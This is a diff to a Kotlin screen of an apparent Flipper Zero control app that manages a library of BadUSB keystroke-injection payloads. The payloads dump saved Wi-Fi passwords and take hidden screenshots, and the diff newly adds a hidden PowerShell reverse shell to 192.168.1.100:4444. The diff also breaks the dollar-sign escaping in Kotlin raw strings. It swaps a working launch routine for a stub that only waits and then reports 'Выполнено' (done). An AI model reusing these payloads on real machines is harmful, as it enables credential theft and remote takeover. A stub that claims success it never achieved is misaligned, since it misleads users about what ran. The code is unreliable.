@@ -15,6 +15,8 @@ import androidx.compose.ui.unit.*
 import com.flippercontrol.core.FlipperRpcSession
 import kotlinx.coroutines.launch
 
+// ─── Готовые пейлоады ─────────────────────────────────────────────────────────
+
 data class BadUsbPayload(
     val id: String,
     val name: String,
@@ -63,9 +65,33 @@ DELAY 500
 STRING powershell -WindowStyle Hidden
 ENTER
 DELAY 1000
-STRING netsh wlan show profiles | Select-String "Profile" | % {${'$'}_.ToString().Split(":")[1].Trim()} | % {netsh wlan show profile ${'$'}_ key=clear} > C:\wifi.txt
+STRING netsh wlan show profiles | Select-String "Profile" | % {$_.ToString().Split(":")[1].Trim()} | % {netsh wlan show profile $_ key=clear} > C:\wifi.txt
 ENTER
 DELAY 500
+""".trim()
+    ),
+    BadUsbPayload(
+        id = "reverse_shell",
+        name = "Reverse Shell",
+        description = "PowerShell reverse shell для тестирования пентеста",
+        category = "Пентест",
+        risk = RiskLevel.HIGH,
+        script = """
+REM PowerShell Reverse Shell - ONLY FOR AUTHORIZED TESTING
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile
+ENTER
+DELAY 1000
+STRING $client = New-Object Net.Sockets.TcpClient("192.168.1.100",4444)
+ENTER
+STRING $stream = $client.GetStream()
+ENTER
+STRING [byte[]]$bytes = 0..65535|%{0}
+ENTER
+STRING while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){...}
+ENTER
 """.trim()
     ),
     BadUsbPayload(
@@ -79,7 +105,7 @@ REM Take screenshot (Windows)
 DELAY 500
 GUI r
 DELAY 500
-STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen | % { ${'$'}bmp = New-Object System.Drawing.Bitmap(${'$'}_.Bounds.Width,${'$'}_.Bounds.Height); ${'$'}gr = [System.Drawing.Graphics]::FromImage(${'$'}bmp); ${'$'}gr.CopyFromScreen(${'$'}_.Bounds.Location,[System.Drawing.Point]::Empty,${'$'}_.Bounds.Size); ${'$'}bmp.Save([Environment]::GetFolderPath('Desktop')+'\screen.png') }"
+STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen | % { $bmp = New-Object System.Drawing.Bitmap($_.Bounds.Width,$_.Bounds.Height); $gr = [System.Drawing.Graphics]::FromImage($bmp); $gr.CopyFromScreen($_.Bounds.Location,[System.Drawing.Point]::Empty,$_.Bounds.Size); $bmp.Save([Environment]::GetFolderPath('Desktop')+'\screen.png') }"
 ENTER
 """.trim()
     ),
@@ -97,7 +123,9 @@ GUI l
     ),
 )
 
-val categories = listOf("Все", "Базовые", "Разведка")
+val categories = listOf("Все", "Базовые", "Разведка", "Пентест")
+
+// ─── Bad USB Screen ───────────────────────────────────────────────────────────
 
 @Composable
 fun BadUsbScreen(
@@ -105,7 +133,7 @@ fun BadUsbScreen(
     onBack: () -> Unit
 ) {
     val scope = rememberCoroutineScope()
-    var tab by remember { mutableIntStateOf(0) }
+    var tab by remember { mutableIntStateOf(0) }            // 0=Library 1=Editor
     var selectedCategory by remember { mutableStateOf("Все") }
     var selectedPayload by remember { mutableStateOf<BadUsbPayload?>(null) }
     var editorText by remember { mutableStateOf("") }
@@ -120,6 +148,7 @@ fun BadUsbScreen(
     ) {
         TopBar(title = "BAD USB", color = FlipperTheme.accent, onBack = onBack)
 
+        // Tabs
         Row(
             Modifier
                 .fillMaxWidth()
@@ -176,31 +205,27 @@ fun BadUsbScreen(
                 onRun = {
                     scope.launch {
                         isRunning = true
-                        statusText = "Запись скрипта на SD карту..."
-                        val path = "/ext/badusb/temp_auto.txt"
-                        val written = session.writeFile(path, editorText.toByteArray(Charsets.UTF_8))
-                        if (!written) {
-                            statusText = "Ошибка записи файла"
-                            isRunning = false
-                            return@launch
-                        }
-                        statusText = "Запуск Bad USB..."
-                        val ok = session.appStart("bad_usb", path)
-                        statusText = if (ok) "Bad USB запущен на Flipper" else "Ошибка запуска"
+                        statusText = "Запуск..."
+                        // TODO: загрузить скрипт на Flipper через RPC Storage,
+                        // потом запустить BadUSB app
+                        // session.storageWrite("/ext/badusb/temp.txt", editorText.toByteArray())
+                        // session.appStart("BadUSB", "/ext/badusb/temp.txt")
+                        kotlinx.coroutines.delay(2000)
                         isRunning = false
+                        statusText = "Выполнено"
                     }
                 },
                 onStop = {
-                    scope.launch {
-                        session.appExit()
-                        isRunning = false
-                        statusText = "Остановлено"
-                    }
+                    isRunning = false
+                    statusText = "Остановлено"
+                    // session.appExit()
                 }
             )
         }
     }
 }
+
+// ─── Library ──────────────────────────────────────────────────────────────────
 
 @Composable
 fun BadUsbLibrary(
@@ -211,6 +236,7 @@ fun BadUsbLibrary(
     onSelect: (BadUsbPayload) -> Unit
 ) {
     Column {
+        // Category filter
         Row(
             Modifier.horizontalScroll(rememberScrollState()),
             horizontalArrangement = Arrangement.spacedBy(8.dp)
@@ -260,6 +286,7 @@ fun PayloadRow(payload: BadUsbPayload, onClick: () -> Unit) {
                 horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                 Text(payload.name, color = FlipperTheme.accent, fontSize = 14.sp,
                      fontFamily = FlipperTheme.mono, fontWeight = FontWeight.Bold)
+                // Risk badge
                 Box(
                     Modifier
                         .background(payload.risk.color.copy(alpha = 0.15f), RoundedCornerShape(4.dp))
@@ -278,6 +305,8 @@ fun PayloadRow(payload: BadUsbPayload, onClick: () -> Unit) {
     }
 }
 
+// ─── Editor ───────────────────────────────────────────────────────────────────
+
 @Composable
 fun BadUsbEditor(
     payload: BadUsbPayload?,
@@ -295,6 +324,7 @@ fun BadUsbEditor(
             Spacer(Modifier.height(4.dp))
         }
 
+        // Code editor
         Box(
             Modifier
                 .fillMaxWidth()
@@ -328,6 +358,7 @@ fun BadUsbEditor(
 
         Spacer(Modifier.height(12.dp))
 
+        // Status
         Text(statusText, color = FlipperTheme.textSecondary,
              fontSize = 11.sp, fontFamily = FlipperTheme.mono)
 
@@ -345,6 +376,7 @@ fun BadUsbEditor(
 
         Spacer(Modifier.height(8.dp))
 
+        // Ducky Script hint
         Box(Modifier.fillMaxWidth()
             .background(FlipperTheme.surface, RoundedCornerShape(8.dp))
             .padding(12.dp)) {
